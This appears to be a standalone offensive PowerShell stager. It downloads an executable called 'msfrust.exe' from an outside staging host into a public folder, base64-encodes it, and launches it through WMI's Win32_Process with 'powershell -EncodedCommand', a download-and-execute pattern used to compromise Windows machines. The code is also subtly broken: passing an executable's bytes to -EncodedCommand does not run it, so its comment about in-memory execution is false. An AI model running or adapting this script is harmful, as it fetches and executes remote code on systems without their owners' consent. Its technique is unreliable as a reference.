$client = New-Object System.Net.WebClient
$client.Headers.Add('User-Agent', 'Stage (https://stage.attck-deploy.net/msfrust.exe)')
$filePath = "C:\Users\public\Documents\msfrust.exe" # Change this to your desired output directory and file name
$url = "https://stage.attck-deploy.net/msfrust.exe"
$client.DownloadFile($url, $filePath)

# Wait for the file to finish downloading before executing it
Start-Sleep -Seconds 10

# Convert the executable and arguments to base64-encoded strings
$exeBytes = [System.IO.File]::ReadAllBytes($filePath)
$exeBase64 = [System.Convert]::ToBase64String($exeBytes)

# Create a new WMI object for the Win32_Process class
$process = [WMIClass]"\\.\root\cimv2:Win32_Process"

# Call the Create method of the Win32_Process class to start the executable in memory with the specified arguments
$process.Create("powershell.exe -EncodedCommand $exeBase64")